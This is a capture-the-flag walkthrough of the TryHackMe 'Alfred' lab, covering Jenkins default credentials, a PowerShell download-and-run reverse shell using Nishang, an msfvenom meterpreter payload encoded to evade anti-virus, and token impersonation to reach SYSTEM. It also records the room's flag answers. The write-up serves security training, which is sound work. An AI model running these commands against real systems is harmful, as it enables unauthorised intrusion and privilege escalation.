<p><h3> Welcome to the <em>TryHackMe</em></h3>
<h1>Offensive Pentesting learning path> Advanced Exploitation</h1>
<h2>Alfred</h2>
<p>Exploit Jenkins to gain an initial shell, then escalate your privileges by exploiting Windows authentication token.</p>
<br>
October 19, 2024<br><br>
Type: Easy<br>
Link: https://tryhackme.com/r/room/alfred</p><br>

![image](https://github.com/user-attachments/assets/98d40464-d228-45b7-81cd-2f7881ef1cd3)



<p><h2>Task 1 - Initial Access</h2>

![image](https://github.com/user-attachments/assets/d7beaef3-c7f9-40af-87a2-4c8d7c35ef0d)

In this room, we'll learn how to exploit a common misconfiguration on a widely used automation server(Jenkins - This tool is used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made changes to it). After which, we'll use an interesting privilege escalation method to get full system access. <br><br>
Since this is a Windows application, we'll be using <strong>Nishang</strong> to gain initial access. The repository contains a useful set of scripts for initial access, enumeration and privilege escalation. In this case, we'll be using the <strong>reverse shell scripts</strong>.<br><br>
Please note that this machine <strong>does not respond to ping</strong> (ICMP) and may take a few minutes to boot up.

In the following link you´ll find more information about Nishang.https://github.com/samratashok/nishang<br>
And in tis other link we will find more abour reverse shell scripts. https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</p>

<p><br></p>

> 1.1 - <em>How many ports are open? (TCP only)?</em><br>
>> <strong>3</strong><br><br>
>> Performing Nmap I identified 3 ports open: 80/http, 3389/ssl, and 8080/http.<br>
>> <code>nmap -Pn -sC -sV -sS -p- -T4 10.10.30.67</code><br>

![image](https://github.com/user-attachments/assets/b73da9a5-0b5e-4f75-9a58-ce2df7996060)<br>

>> <code>nmap -sCV -sT -Pn -v 10.10.30.67</code><br>

![image](https://github.com/user-attachments/assets/0c391498-4259-43af-9a86-26b4a6dd0c16)


<p><br></p>

<p>I accessed the target IP in port 80 and I did not find anything interesting.</p>

![image](https://github.com/user-attachments/assets/7d9feb1f-49b4-436c-8c2d-85791831fcb5)

<p>Then I proceeded accessing target IP in port 8080 and I found a login form.</p>

![image](https://github.com/user-attachments/assets/db02187c-6d20-4c0e-875f-8f6067772087)

<p>I tried admin:admin.</p>

![image](https://github.com/user-attachments/assets/db908e1a-4096-4e7a-8ceb-2c798c0867d4)

<p> "The Jenkins default username is admin. Reference = https://answers.microsoft.com/en-us/windows/forum/all/i-am-not-able-to-find-user-account-credentials/9b451233-0f79-422d-9c13-20aa6e2831f1".<br><br>
Since in this room there is this ****:****, I tried admin:admin.It worked!</p>

<p></p>

> 1.2 - <em>What is the username and password for the login panel? (in the format username:password)</em><br>
>> <strong>admin:admin</strong><br><br>
>> "The Jenkins default username is admin. Reference = https://answers.microsoft.com/en-us/windows/forum/all/i-am-not-able-to-find-user-account-credentials/9b451233-0f79-422d-9c13-20aa6e2831f1". Since in this room there is this ****:****, I tried admin:admin.<br>

<p></p>

![image](https://github.com/user-attachments/assets/40a8d242-cbe5-46f5-a3de-8d7241376751)

<p><br></p>

<p>So after employing admin:admin credentials I got here.</p>

![image](https://github.com/user-attachments/assets/711c3b4f-8877-4014-9f6e-0cbe192c1e06)

<p>I decided to explore the <em>Project</em> section.</p><br>

![image](https://github.com/user-attachments/assets/410de7cc-bf99-4915-b904-6b22ba5128a3)

<p>Next I clicked on <em>Configure</em>.</p><br>

![image](https://github.com/user-attachments/assets/822a6e46-066c-4762-8770-d494a86626b9)

<p><br></p>

<p>Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: <code>powershell iex</code> (<em>New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port</em></p>

<p><br></p>

<p><strong>You first need to download the Powershell script and make it available for the server to download. You can do this by creating an http server with python: <code>python3 -m http.server</code></strong></p>
<p><br></p>
![image](https://github.com/user-attachments/assets/30e9d533-5414-46d8-8fcd-56a88a3ca6c5)
<p><br></p>
>> <code>wget https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</code>
<p><br></p>
![image](https://github.com/user-attachments/assets/4bfa593a-5b61-4a81-b9a8-72b3892da57a)
<p><br></p>
![image](https://github.com/user-attachments/assets/a83e48e6-c2c7-41b0-8b64-e4726066d52f)
<p><br></p>
![image](https://github.com/user-attachments/assets/6cbc1495-da11-4738-b2f5-c119b17af57b)
<p><br></p>
![image](https://github.com/user-attachments/assets/7cc2d756-ea43-4068-b5f6-77a73779b2c3)
<p><br></p>
![image](https://github.com/user-attachments/assets/dc9e733e-b885-471f-b346-327c489d8c11)
<p><br></p>
![image](https://github.com/user-attachments/assets/ce8573a5-14d4-4ba0-ab33-5894b7e30561)
<p><br></p>
<p>After clicking <em>Build Now</em>, Build #3 is created, and available in <em>Build History</em>.</p>
<p><br></p>
![image](https://github.com/user-attachments/assets/6f205086-cff3-497c-89e4-b263fd3efb35)
<p><br></p>

![image](https://github.com/user-attachments/assets/5c109160-a2db-45fa-ba9b-030920dcf7f6)
<p><br></p>
![image](https://github.com/user-attachments/assets/b6df0b15-3104-4020-b78c-df7ee3888f49)
<p><br></p>
![image](https://github.com/user-attachments/assets/f065059a-498b-4f36-8ff2-410468e63f56)
<p><br></p>
![image](https://github.com/user-attachments/assets/b66e40ff-823e-4907-9fd2-bc5aa4785a1b)
<p><br></p>
![image](https://github.com/user-attachments/assets/e1c34d79-c2f7-491b-954d-e7bfd2bc0b29)
<p><br></p>

![image](https://github.com/user-attachments/assets/75daf0fb-2ee2-48b5-a9a5-2aebed47c098)


![image](https://github.com/user-attachments/assets/56ec077c-ea5f-427f-a75d-4167a479a730)

> 1.3 - <br>
>> <strong>No answer needed</strong>

<p><br></p>

> 1.4 - <em>What is the user.txt flag? </em><br>
>> <strong>79007a09481963edf2e1321abd9ae2a0</strong>

![image](https://github.com/user-attachments/assets/d12e0d34-d555-4afc-bd1e-33a5fd1feffd)

<p><br></p>

<p><h2>Task 2 - Switching Shells</h2>
To make the privilege escalation easier, let's switch to a meterpreter shell using the following process.<br><br>
Use msfvenom to create a Windows meterpreter reverse shell using the following payload:<br><br>
  
> <strong>msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe</strong>

This payload generates an encoded x86-64 reverse TCP meterpreter payload. Payloads are usually encoded to ensure that they are transmitted correctly and also to evade anti-virus products. An anti-virus product may not recognise the payload and won't flag it as malicious.<br><br>
After creating this payload, download it to the machine using the same method in the previous step:<br><br>

> <strong>powershell "(New-Object System.Net.WebClient).Downloadfile('http://your-thm-ip:8000/shell-name.exe','shell-name.exe')"</strong>

Before running this program, ensure the handler is set up in Metasploit:<br><br>

> <strong>use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-thm-ip set LPORT listening-port run</strong>

This step uses the Metasploit handler to receive the incoming connection from your reverse shell. Once this is running, enter this command to start the reverse shell<br><br>

> <strong>Start-Process "shell-name.exe"</strong>

This should spawn a meterpreter shell for you!</p>

<p><br></p>


> 2.1 - <em>What is the final size of the exe payload that you generated?</em><br>
>> <strong>73802</strong><br>
>> <code>msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe</code>
![image](https://github.com/user-attachments/assets/96599c2e-c0c5-4f8c-af6d-49892287c40d)

<p><br></p>

<p><h2>Task 3 - Privilege Escalation</h2>
Now that we have initial access, let's use token impersonation to gain system access.<br><br>
Windows uses tokens to ensure that accounts have the right privileges to carry out particular actions. Account tokens are assigned to an account when users log in or are authenticated. This is usually done by LSASS.exe(think of this as an authentication process).</p><br><br>

This access token consists of:<br>
- User SIDs(security identifier)<br>
- Group SIDs<br>
- Privileges<br>

<p>Amongst other things. More detailed information can be found here.<br><br>

There are two types of access tokens:<br>
- Primary access tokens: those associated with a user account that are generated on log on<br>
- Impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process <br><br>

For an impersonation token, there are different levels:<br>
- SecurityAnonymous: current user/client cannot impersonate another user/client<br>
- SecurityIdentification: current user/client can get the identity and privileges of a client but cannot impersonate the client<br>
- SecurityImpersonation: current user/client can impersonate the client's security context on the local system<br>
- SecurityDelegation: current user/client can impersonate the client's security context on a remote system<br><br>

Where the security context is a data structure that contains users' relevant security information.<br><br>

The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions. Here are the most commonly abused privileges:<br>
- SeImpersonatePrivilege<br>
- SeAssignPrimaryPrivilege<br>
- SeTcbPrivilege<br>
- SeBackupPrivilege<br>
- SeRestorePrivilege<br>
- SeCreateTokenPrivilege<br>
- SeLoadDriverPrivilege<br>
- SeTakeOwnershipPrivilege<br>
- SeDebugPrivilege<br><br>

There's more reading here.  (inserit LINK)<br><br>

<p><br></p>

> 3.1 - <em>View all the privileges using whoami /priv</em><br>
>> <strong>No answer needed</strong>
![image](https://github.com/user-attachments/assets/70bee5aa-6aeb-4230-9acc-0f5e2efa61b8)


<p><br></p>

<p>You can see that two privileges(SeDebugPrivilege, SeImpersonatePrivilege) are enabled. Let's use the incognito module that will allow us to exploit this vulnerability.</p>

<p><br></p>

![image](https://github.com/user-attachments/assets/dc919c89-fe8a-419e-9407-136e24a79706)

![image](https://github.com/user-attachments/assets/940ebefe-0b97-4311-b656-6ef8a49ac5bf)

![image](https://github.com/user-attachments/assets/50928581-b1f5-4f93-9942-a9879d398e66)

![image](https://github.com/user-attachments/assets/4f9e39c8-fbc4-46cc-a20c-16842a8f1ea6)

![image](https://github.com/user-attachments/assets/f10136f7-253b-4b98-b19d-1350b14b5c9a)

![image](https://github.com/user-attachments/assets/91916afd-63e6-44f8-9125-18d253e5fe66)

![image](https://github.com/user-attachments/assets/5bc4a15d-2f8d-48fb-88a5-b55097688dfe)

![image](https://github.com/user-attachments/assets/e701e932-ff3e-4ee2-aa6f-9df3f780674a)

![image](https://github.com/user-attachments/assets/944b6356-985e-4bec-af8c-172c8fdaa5c3)

![image](https://github.com/user-attachments/assets/868d253c-fee1-477d-b978-65a41697f931)

















> 3.2 - <em>Enter: load incognito to load the incognito module in Metasploit. Please note that you may need to use the use incognito command if the previous command doesn't work. Also, ensure that your Metasploit is up to date.</em><br>
>> <strong>No answer needed</strong>

<p><br></p>

<p>To check which tokens are available, enter the list_tokens -g. We can see that the BUILTIN\Administrators token is available.</p>

<p><br></p>

> 3.3 - <em>Use the impersonate_token "BUILTIN\Administrators" command to impersonate the Administrators' token. What is the output when you run the getuid command?</em><br>
>> <strong>NT AUTHORITY\SYSTEM</strong>

![image](https://github.com/user-attachments/assets/470702c0-e336-492f-8e47-ced6373ee0ed)


<p><br></p>

<p>Even though you have a higher privileged token, you may not have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do).</p>

<p><br></p>

> 3.4 - <em>Ensure that you migrate to a process with correct permissions (the above question's answer). The safest process to pick is the services.exe process. First, use the ps command to view processes and find the PID of the services.exe process. Migrate to this process using the command migrate PID-OF-PROCESS</em><br>
>> <strong>No answer needed</strong>

<p><br></p>

> 3.5 - <em>Read the root.txt file located at C:\Windows\System32\config</em><br>
>> <strong>dff0f748678f280250f25a45b8046b4a</strong>

<p><br></p>


![image](https://github.com/user-attachments/assets/c148494c-56bf-46eb-83d4-03b96440e8d5)

